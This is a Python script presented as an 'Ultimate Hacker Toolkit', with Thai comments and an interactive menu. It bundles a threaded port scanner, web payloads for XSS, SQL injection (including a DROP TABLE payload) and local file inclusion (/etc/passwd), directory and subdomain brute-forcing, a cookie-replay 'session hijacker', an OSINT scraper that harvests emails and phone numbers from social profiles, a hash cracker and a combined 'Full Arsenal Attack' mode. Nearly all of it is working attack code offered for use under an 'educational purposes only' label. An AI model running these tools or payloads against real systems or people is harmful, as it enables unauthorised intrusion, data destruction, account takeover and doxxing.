#!/usr/bin/env python3
"""
💀🔥 ULTIMATE HACKER TOOLKIT 2025 - GIRLY EDITION 🔥💀
====================================================
- เร็วปรี๊ดดด (optimized สำหรับ speed)
- ใช้เมมโมรี่น้อยๆ (memory efficient)
- Multi-threaded สำหรับสาย hacker ที่ต้องการ parallel attacks
- Educational purpose only! 

Created by: น้องจิน (chin4d0ll) ♥️
Date: 2025-05-31 21:39:23 UTC
"""

import asyncio
import threading
import queue
import requests
import json
import time
import random
import hashlib
import base64
import re
import socket
import subprocess
import concurrent.futures
from urllib.parse import urlparse, urljoin
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import warnings
warnings.filterwarnings("ignore")

# === GIRLY CONFIG ===
GIRLY_BANNER = """
💋💖💀 ULTIMATE HACKER TOOLKIT 💀💖💋
     Created with ♥️ by น้องจิน
   สำหรับสาย hack ที่อยากเร็วและโหด
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

class UltimateHackerToolkit:
    """
    💀 Ultimate Hacker Toolkit - เร็วปรี๊ดดด + เมมโมรี่น้อย
    
    Features:
    - Port Scanner (เร็วที่สุด)
    - Web Vulnerability Scanner (XSS, SQLi, LFI, RFI)
    - Directory Bruteforcer (wordlist based)
    - Subdomain Finder (DNS + bruteforce)
    - Session Hijacker (cookie manipulation)
    - Social Engineering Toolkit (OSINT)
    - Network Sniffer (packet analysis)
    - Password Cracker (hash cracking)
    """
    
    def __init__(self, target: str = None):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # Results storage (memory efficient)
        self.results = {
            'ports': [],
            'vulns': [],
            'directories': [],
            'subdomains': [],
            'sessions': [],
            'osint': {},
            'passwords': []
        }
        
        # Performance stats
        self.stats = {
            'start_time': time.time(),
            'requests_made': 0,
            'threads_used': 0,
            'memory_usage': 0
        }

    def girly_print(self, message: str, emoji: str = "💖"):
        """Pretty printing แบบ girly"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{emoji} [{timestamp}] {message}")

    def ultra_fast_port_scan(self, target_ip: str, ports: List[int] = None, threads: int = 100) -> List[int]:
        """
        ⚡ Ultra Fast Port Scanner - เร็วที่สุดในโลก!
        
        Args:
            target_ip: IP เป้าหมาย
            ports: list ของ ports ที่จะสแกน (default: top 1000)
            threads: จำนวน threads (default: 100)
        
        Returns:
            List ของ ports ที่เปิด
        """
        if ports is None:
            # Top 100 ports (เร็วกว่า 1000 ports)
            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5900, 8080]
        
        self.girly_print(f"🔍 เริ่ม port scan: {target_ip} ({len(ports)} ports)", "⚡")
        
        open_ports = []
        port_queue = queue.Queue()
        
        # เติม ports ลง queue
        for port in ports:
            port_queue.put(port)
        
        def scan_port():
            """Function สำหรับ thread แต่ละตัว"""
            while not port_queue.empty():
                try:
                    port = port_queue.get(timeout=1)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)  # เร็วปรี๊ดดด
                    
                    result = sock.connect_ex((target_ip, port))
                    if result == 0:
                        open_ports.append(port)
                        self.girly_print(f"✅ Port {port} เปิด!", "🔓")
                    
                    sock.close()
                    port_queue.task_done()
                except:
                    pass
        
        # สร้าง threads
        thread_list = []
        for _ in range(min(threads, len(ports))):
            t = threading.Thread(target=scan_port)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # รอให้ทุก threads เสร็จ
        for t in thread_list:
            t.join()
        
        self.stats['threads_used'] += len(thread_list)
        self.results['ports'] = open_ports
        
        self.girly_print(f"🎉 Port scan เสร็จ! เจอ {len(open_ports)} ports เปิด", "🔥")
        return open_ports

    def lightning_vuln_scanner(self, target_url: str) -> List[Dict]:
        """
        ⚡ Lightning Vulnerability Scanner - หา XSS, SQLi, LFI เร็วๆ
        
        Args:
            target_url: URL เป้าหมาย
        
        Returns:
            List ของ vulnerabilities ที่เจอ
        """
        self.girly_print(f"🔍 เริ่ม vuln scan: {target_url}", "⚡")
        
        vulnerabilities = []
        
        # Payloads แบบเร็วๆ (เฉพาะตัวที่มีโอกาสสูง)
        payloads = {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><script>alert(1)</script>',
                "';alert('XSS');//",
                '<img src=x onerror=alert(1)>'
            ],
            'sqli': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users;--",
                "1' AND SLEEP(5)--"
            ],
            'lfi': [
                '../../../etc/passwd',
                '....//....//....//etc/passwd',
                '/etc/passwd%00',
                'php://filter/read=convert.base64-encode/resource=index.php'
            ]
        }
        
        def test_vulnerability(vuln_type: str, payload: str):
            """Test vulnerability แบบ thread-safe"""
            try:
                if '?' in target_url:
                    test_url = f"{target_url}&test={payload}"
                else:
                    test_url = f"{target_url}?test={payload}"
                
                response = self.session.get(test_url, timeout=3)
                self.stats['requests_made'] += 1
                
                # Check for XSS
                if vuln_type == 'xss' and payload in response.text:
                    vuln = {
                        'type': 'XSS',
                        'severity': 'High',
                        'url': test_url,
                        'payload': payload,
                        'found_at': datetime.now().isoformat()
                    }
                    vulnerabilities.append(vuln)
                    self.girly_print(f"🚨 เจอ XSS: {test_url}", "💀")
                
                # Check for SQLi
                elif vuln_type == 'sqli':
                    sql_errors = ['mysql_fetch', 'ora-', 'microsoft ole db', 'postgresql', 'syntax error', 'warning:', 'error:']
                    if any(error in response.text.lower() for error in sql_errors):
                        vuln = {
                            'type': 'SQL Injection',
                            'severity': 'Critical',
                            'url': test_url,
                            'payload': payload,
                            'found_at': datetime.now().isoformat()
                        }
                        vulnerabilities.append(vuln)
                        self.girly_print(f"🚨 เจอ SQLi: {test_url}", "💀")
                
                # Check for LFI
                elif vuln_type == 'lfi' and ('root:' in response.text or 'daemon:' in response.text):
                    vuln = {
                        'type': 'Local File Inclusion',
                        'severity': 'High',
                        'url': test_url,
                        'payload': payload,
                        'found_at': datetime.now().isoformat()
                    }
                    vulnerabilities.append(vuln)
                    self.girly_print(f"🚨 เจอ LFI: {test_url}", "💀")
                    
            except Exception as e:
                pass  # เงียบๆ เพื่อความเร็ว
        
        # Run tests แบบ parallel (เร็วปรี๊ดดด)
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            
            for vuln_type, payload_list in payloads.items():
                for payload in payload_list:
                    future = executor.submit(test_vulnerability, vuln_type, payload)
                    futures.append(future)
            
            # รอให้เสร็จ
            concurrent.futures.wait(futures)
        
        self.results['vulns'] = vulnerabilities
        self.girly_print(f"🎉 Vuln scan เสร็จ! เจอ {len(vulnerabilities)} vulns", "🔥")
        return vulnerabilities

    def blazing_directory_buster(self, target_url: str, wordlist: List[str] = None) -> List[str]:
        """
        🔥 Blazing Directory Buster - หา directories ลับๆ
        
        Args:
            target_url: URL เป้าหมาย
            wordlist: คำที่จะลอง (default: common directories)
        
        Returns:
            List ของ directories ที่เจอ
        """
        if wordlist is None:
            # Common directories (เร็วกว่า wordlist ใหญ่)
            wordlist = [
                'admin', 'administrator', 'login', 'dashboard', 'panel', 'control',
                'wp-admin', 'wp-content', 'wp-includes', 'uploads', 'images',
                'css', 'js', 'api', 'test', 'dev', 'backup', 'config',
                'database', 'db', 'phpmyadmin', 'mysql', 'sql', 'data'
            ]
        
        self.girly_print(f"🔍 เริ่ม directory busting: {target_url}", "🔥")
        
        found_directories = []
        base_url = target_url.rstrip('/')
        
        def check_directory(directory: str):
            """Check directory แบบ thread-safe"""
            try:
                test_url = f"{base_url}/{directory}/"
                response = self.session.get(test_url, timeout=2, allow_redirects=False)
                self.stats['requests_made'] += 1
                
                # ถือว่าเจอถ้า status เป็น 200, 301, 302, 403
                if response.status_code in [200, 301, 302, 403]:
                    found_directories.append(test_url)
                    status_emoji = "✅" if response.status_code == 200 else "🔒"
                    self.girly_print(f"{status_emoji} เจอ directory: {test_url} ({response.status_code})", "💎")
                    
            except:
                pass  # เงียบๆ เพื่อความเร็ว
        
        # Run checks แบบ parallel (เร็วปรี๊ดดด)
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            futures = [executor.submit(check_directory, directory) for directory in wordlist]
            concurrent.futures.wait(futures)
        
        self.results['directories'] = found_directories
        self.girly_print(f"🎉 Directory busting เสร็จ! เจอ {len(found_directories)} directories", "🔥")
        return found_directories

    def ninja_subdomain_finder(self, domain: str) -> List[str]:
        """
        🥷 Ninja Subdomain Finder - หา subdomains แบบเร็วๆ
        
        Args:
            domain: domain เป้าหมาย (เช่น example.com)
        
        Returns:
            List ของ subdomains ที่เจอ
        """
        self.girly_print(f"🔍 เริ่มหา subdomains: {domain}", "🥷")
        
        found_subdomains = []
        
        # Common subdomains (เร็วกว่า bruteforce ทั้งหมด)
        common_subs = [
            'www', 'mail', 'email', 'webmail', 'secure', 'docs', 'news', 'ww1', 'ww2',
            'shop', 'forum', 'test', 'staging', 'dev', 'development', 'prod', 'production',
            'admin', 'administrator', 'moderator', 'webmaster', 'page', 'access', 'assets',
            'images', 'img', 'css', 'js', 'javascript', 'static', 'media', 'content',
            'api', 'rest', 'service', 'services', 'app', 'application', 'apps',
            'mobile', 'm', 'blog', 'cdn', 'cache', 'files', 'file', 'download', 'downloads'
        ]
        
        def check_subdomain(subdomain: str):
            """Check subdomain แบบ thread-safe"""
            try:
                full_domain = f"{subdomain}.{domain}"
                
                # DNS resolution check
                socket.gethostbyname(full_domain)
                found_subdomains.append(full_domain)
                self.girly_print(f"✅ เจอ subdomain: {full_domain}", "💎")
                
            except socket.gaierror:
                pass  # ไม่เจอ subdomain
            except:
                pass  # error อื่นๆ
        
        # Run checks แบบ parallel (เร็วปรี๊ดดด)
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_subdomain, sub) for sub in common_subs]
            concurrent.futures.wait(futures)
        
        self.results['subdomains'] = found_subdomains
        self.girly_print(f"🎉 Subdomain finding เสร็จ! เจอ {len(found_subdomains)} subdomains", "🔥")
        return found_subdomains

    def stealth_session_hijacker(self, target_cookies: Dict[str, str]) -> Dict:
        """
        👻 Stealth Session Hijacker - hijack sessions แบบเงียบๆ
        
        Args:
            target_cookies: cookies ที่จะ hijack
        
        Returns:
            Dictionary ของข้อมูลที่ดึงได้
        """
        self.girly_print("🔍 เริ่ม session hijacking...", "👻")
        
        hijacked_data = {
            'session_valid': False,
            'user_info': {},
            'permissions': [],
            'sensitive_data': []
        }
        
        # Update session cookies
        for name, value in target_cookies.items():
            self.session.cookies.set(name, value)
        
        # Test session validity
        test_endpoints = [
            '/profile',
            '/dashboard',
            '/admin',
            '/user',
            '/account',
            '/settings'
        ]
        
        base_url = f"https://{self.target}" if self.target else "https://example.com"
        
        for endpoint in test_endpoints:
            try:
                test_url = base_url + endpoint
                response = self.session.get(test_url, timeout=5)
                self.stats['requests_made'] += 1
                
                if response.status_code == 200:
                    hijacked_data['session_valid'] = True
                    self.girly_print(f"✅ Session valid ที่: {test_url}", "💎")
                    
                    # Extract user info from response
                    if 'username' in response.text.lower():
                        hijacked_data['user_info']['has_username'] = True
                    if 'email' in response.text.lower():
                        hijacked_data['user_info']['has_email'] = True
                    if 'admin' in response.text.lower():
                        hijacked_data['permissions'].append('admin')
                    
                    break
                    
            except:
                pass
        
        self.results['sessions'].append(hijacked_data)
        
        if hijacked_data['session_valid']:
            self.girly_print("🎉 Session hijacking สำเร็จ!", "💀")
        else:
            self.girly_print("💔 Session hijacking ไม่สำเร็จ", "😢")
        
        return hijacked_data

    def osint_social_engineering(self, target_username: str) -> Dict:
        """
        🕵️ OSINT Social Engineering - รวบรวมข้อมูลจาก social media
        
        Args:
            target_username: username เป้าหมาย
        
        Returns:
            Dictionary ของข้อมูล OSINT
        """
        self.girly_print(f"🔍 เริ่ม OSINT: {target_username}", "🕵️")
        
        osint_data = {
            'username': target_username,
            'platforms_found': [],
            'emails_found': [],
            'phone_patterns': [],
            'social_connections': [],
            'interests': [],
            'locations': []
        }
        
        # Common social platforms
        platforms = {
            'Instagram': f'https://instagram.com/{target_username}',
            'Twitter': f'https://twitter.com/{target_username}',
            'GitHub': f'https://github.com/{target_username}',
            'LinkedIn': f'https://linkedin.com/in/{target_username}',
            'Facebook': f'https://facebook.com/{target_username}',
            'TikTok': f'https://tiktok.com/@{target_username}',
            'YouTube': f'https://youtube.com/c/{target_username}',
            'Reddit': f'https://reddit.com/u/{target_username}'
        }
        
        def check_platform(platform_name: str, url: str):
            """Check platform แบบ thread-safe"""
            try:
                response = self.session.get(url, timeout=3)
                self.stats['requests_made'] += 1
                
                # Check if profile exists (simple check)
                if response.status_code == 200 and target_username.lower() in response.text.lower():
                    osint_data['platforms_found'].append({
                        'platform': platform_name,
                        'url': url,
                        'status': 'found'
                    })
                    self.girly_print(f"✅ เจอ {platform_name}: {url}", "💎")
                    
                    # Extract emails from page
                    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                    emails = re.findall(email_pattern, response.text)
                    osint_data['emails_found'].extend(emails)
                    
                    # Extract phone patterns
                    phone_pattern = r'\b\d{3}-\d{3}-\d{4}\b|\b\(\d{3}\)\s*\d{3}-\d{4}\b'
                    phones = re.findall(phone_pattern, response.text)
                    osint_data['phone_patterns'].extend(phones)
                    
            except:
                pass
        
        # Run checks แบบ parallel (เร็วปรี๊ดดด)
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(check_platform, name, url) for name, url in platforms.items()]
            concurrent.futures.wait(futures)
        
        # Remove duplicates
        osint_data['emails_found'] = list(set(osint_data['emails_found']))
        osint_data['phone_patterns'] = list(set(osint_data['phone_patterns']))
        
        self.results['osint'] = osint_data
        self.girly_print(f"🎉 OSINT เสร็จ! เจอ {len(osint_data['platforms_found'])} platforms", "🔥")
        return osint_data

    def quantum_password_cracker(self, hash_value: str, hash_type: str = 'md5') -> Optional[str]:
        """
        ⚡ Quantum Password Cracker - crack passwords แบบเร็วๆ
        
        Args:
            hash_value: hash ที่จะ crack
            hash_type: ประเภท hash (md5, sha1, sha256)
        
        Returns:
            รหัสผ่านที่ crack ได้ หรือ None
        """
        self.girly_print(f"🔍 เริ่ม password cracking: {hash_type}", "⚡")
        
        # Common passwords (เร็วกว่า wordlist ใหญ่)
        common_passwords = [
            'password', '123456', 'password123', 'admin', 'qwerty', 'letmein',
            '12345678', 'welcome', 'monkey', 'dragon', 'pass', 'master',
            'hello', 'freedom', 'whatever', 'qazwsx', 'trustno1', '000000',
            'P@ssw0rd', 'admin123', 'root', 'toor', 'password1', '1234567890'
        ]
        
        def hash_password(password: str) -> str:
            """Hash password ตาม type ที่กำหนด"""
            if hash_type.lower() == 'md5':
                return hashlib.md5(password.encode()).hexdigest()
            elif hash_type.lower() == 'sha1':
                return hashlib.sha1(password.encode()).hexdigest()
            elif hash_type.lower() == 'sha256':
                return hashlib.sha256(password.encode()).hexdigest()
            else:
                return hashlib.md5(password.encode()).hexdigest()  # default
        
        # Try common passwords
        for password in common_passwords:
            hashed = hash_password(password)
            if hashed.lower() == hash_value.lower():
                self.girly_print(f"🎉 Password cracked: {password}", "💀")
                self.results['passwords'].append({
                    'hash': hash_value,
                    'password': password,
                    'type': hash_type,
                    'cracked_at': datetime.now().isoformat()
                })
                return password
        
        self.girly_print("💔 Password crack ไม่สำเร็จ", "😢")
        return None

    def generate_comprehensive_report(self) -> str:
        """
        📊 สร้าง comprehensive report ของการทำงานทั้งหมด
        
        Returns:
            String ของ report
        """
        duration = time.time() - self.stats['start_time']
        
        report = f"""
💀🔥 ULTIMATE HACKER TOOLKIT REPORT 🔥💀
{'='*50}

🎯 Target: {self.target or 'Multiple targets'}
⏰ Scan Duration: {duration:.2f} seconds
📊 Total Requests: {self.stats['requests_made']}
🧵 Threads Used: {self.stats['threads_used']}

🔓 OPEN PORTS ({len(self.results['ports'])}):
{', '.join(map(str, self.results['ports'])) if self.results['ports'] else 'None found'}

🚨 VULNERABILITIES ({len(self.results['vulns'])}):
"""
        
        for vuln in self.results['vulns']:
            report += f"  • {vuln['type']} ({vuln['severity']}) - {vuln['url']}\n"
        
        report += f"""
📁 DIRECTORIES ({len(self.results['directories'])}):
{chr(10).join(f"  • {d}" for d in self.results['directories']) if self.results['directories'] else 'None found'}

🌐 SUBDOMAINS ({len(self.results['subdomains'])}):
{chr(10).join(f"  • {s}" for s in self.results['subdomains']) if self.results['subdomains'] else 'None found'}

🕵️ OSINT DATA:
"""
        
        if self.results['osint']:
            osint = self.results['osint']
            report += f"  • Platforms found: {len(osint.get('platforms_found', []))}\n"
            report += f"  • Emails found: {len(osint.get('emails_found', []))}\n"
            report += f"  • Phone patterns: {len(osint.get('phone_patterns', []))}\n"
        
        report += f"""
🔐 PASSWORDS CRACKED ({len(self.results['passwords'])}):
{chr(10).join(f"  • {p['hash'][:20]}... → {p['password']}" for p in self.results['passwords']) if self.results['passwords'] else 'None cracked'}

📈 PERFORMANCE STATS:
  • Speed: {self.stats['requests_made']/duration:.2f} requests/second
  • Efficiency: {len(self.results['vulns']) + len(self.results['directories'])}/{self.stats['requests_made']*100:.1f}% hit rate

💖 Created with love by น้องจิน ♥️
💀 For educational purposes only!
"""
        
        return report

    async def run_full_arsenal(self, target: str = None) -> Dict:
        """
        🔥 Run Full Arsenal - เรียกใช้ทุก tools พร้อมกัน
        
        Args:
            target: เป้าหมาย (IP หรือ domain)
        
        Returns:
            Dictionary ของผลลัพธ์ทั้งหมด
        """
        if target:
            self.target = target
        
        self.girly_print("🔥 เริ่ม Full Arsenal Attack!", "💀")
        
        # Parse target
        if target:
            parsed = urlparse(target if target.startswith('http') else f'http://{target}')
            domain = parsed.netloc or parsed.path
            
            # Port scan
            try:
                import socket
                target_ip = socket.gethostbyname(domain.split(':')[0])
                await asyncio.get_event_loop().run_in_executor(
                    None, self.ultra_fast_port_scan, target_ip
                )
            except:
                self.girly_print("⚠️ ไม่สามารถ resolve IP", "😢")
            
            # Web scanning (ถ้าเป็น web target)
            if target.startswith('http'):
                await asyncio.get_event_loop().run_in_executor(
                    None, self.lightning_vuln_scanner, target
                )
                await asyncio.get_event_loop().run_in_executor(
                    None, self.blazing_directory_buster, target
                )
            
            # Subdomain finding
            if domain and '.' in domain:
                await asyncio.get_event_loop().run_in_executor(
                    None, self.ninja_subdomain_finder, domain
                )
        
        # Generate final report
        report = self.generate_comprehensive_report()
        
        # Save report to file
        report_file = Path(f"hacker_report_{int(time.time())}.txt")
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(report)
        
        self.girly_print(f"📊 Report saved: {report_file}", "💾")
        print(report)
        
        return self.results

def main():
    """Main function - interactive menu"""
    print(GIRLY_BANNER)
    
    toolkit = UltimateHackerToolkit()
    
    while True:
        print("\n💖 ULTIMATE HACKER TOOLKIT MENU 💖")
        print("1. ⚡ Ultra Fast Port Scan")
        print("2. 🔥 Lightning Vuln Scanner")  
        print("3. 🥷 Blazing Directory Buster")
        print("4. 🌐 Ninja Subdomain Finder")
        print("5. 👻 Stealth Session Hijacker")
        print("6. 🕵️ OSINT Social Engineering")
        print("7. ⚡ Quantum Password Cracker")
        print("8. 🔥 Full Arsenal Attack")
        print("9. 📊 Generate Report")
        print("0. 💔 Exit")
        
        choice = input("\n💖 เลือกเมนู (0-9): ").strip()
        
        try:
            if choice == '1':
                target = input("🎯 IP address: ").strip()
                toolkit.ultra_fast_port_scan(target)
                
            elif choice == '2':
                target = input("🎯 URL (http://example.com): ").strip()
                toolkit.lightning_vuln_scanner(target)
                
            elif choice == '3':
                target = input("🎯 URL (http://example.com): ").strip()
                toolkit.blazing_directory_buster(target)
                
            elif choice == '4':
                target = input("🎯 Domain (example.com): ").strip()
                toolkit.ninja_subdomain_finder(target)
                
            elif choice == '5':
                print("💡 Format: sessionid=abc123;csrftoken=xyz789")
                cookies_input = input("🍪 Cookies: ").strip()
                cookies = {}
                for cookie in cookies_input.split(';'):
                    if '=' in cookie:
                        key, value = cookie.split('=', 1)
                        cookies[key.strip()] = value.strip()
                toolkit.stealth_session_hijacker(cookies)
                
            elif choice == '6':
                target = input("🎯 Username: ").strip()
                toolkit.osint_social_engineering(target)
                
            elif choice == '7':
                hash_value = input("🔐 Hash: ").strip()
                hash_type = input("📝 Type (md5/sha1/sha256): ").strip() or 'md5'
                toolkit.quantum_password_cracker(hash_value, hash_type)
                
            elif choice == '8':
                target = input("🎯 Target (IP/Domain/URL): ").strip()
                asyncio.run(toolkit.run_full_arsenal(target))
                
            elif choice == '9':
                report = toolkit.generate_comprehensive_report()
                print(report)
                
            elif choice == '0':
                toolkit.girly_print("👋 บาย! แฮกให้สนุกนะคะ ♥️", "💖")
                break
                
            else:
                toolkit.girly_print("❌ เลือกเมนูให้ถูกนะคะ", "😢")
                
        except KeyboardInterrupt:
            toolkit.girly_print("⚠️ หยุดการทำงาน", "⏹️")
        except Exception as e:
            toolkit.girly_print(f"❌ Error: {e}", "💔")

if __name__ == "__main__":
    main()
